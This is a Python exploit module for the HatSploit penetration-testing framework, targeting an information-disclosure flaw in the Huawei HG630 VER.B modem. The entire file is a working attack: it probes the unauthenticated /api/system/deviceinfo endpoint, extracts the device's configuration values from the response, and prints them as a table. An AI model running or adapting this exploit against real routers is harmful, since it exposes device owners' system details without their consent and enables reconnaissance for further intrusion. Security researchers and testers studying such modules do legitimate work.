"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.module.basic import *
from hatsploit.lib.core.module.proto import HTTP


class HatSploitModule(Module, HTTP):
    def __init__(self):
        super().__init__({
            'Category': "exploit",
            'Name': "Huawei HG630 Information Disclosure",
            'Module': "exploit/linux/huawei/hg630_information_disclosure",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - module developer",
                "Eslam Medhat - vulnerability researcher",
            ],
            'Description': (
                "Huawei HG630 VER.B modem has a vulnerability leading to an information disclosure."
            ),
            'Platform': OS_LINUX,
            'Rank': HIGH_RANK,
            'References': [
                {'URL': 'https://www.exploit-db.com/exploits/48310'},
                {'EDB': 48310}
            ],
            'DisclosureDate': "2020-04-13",
            'Notes': {
                'Stability': [CRASH_SAFE],
                'Reliability': [],
                'SideEffects': [],
            }
        })

    def check(self):
        response = self.http_request(
            method="GET",
            path='/api/system/deviceinfo',
        )

        if response and response.status_code == 200:
            return True

        return False

    def run(self):
        response = self.http_request(
            method="GET",
            path='/api/system/deviceinfo',
        )

        infos = []
        headers = ('Variable', 'Value')

        data = response.text[
               response.text.find('while(1); /*{')
               + len('while(1); /*{'): response.text.find('}*/')
               ]

        for info in data.split(','):
            info = info.split(':')
            if len(info) >= 2:
                infos.append((info[0][1:-1], info[1][1:-1]))

        self.print_table("System Information", headers, *infos)
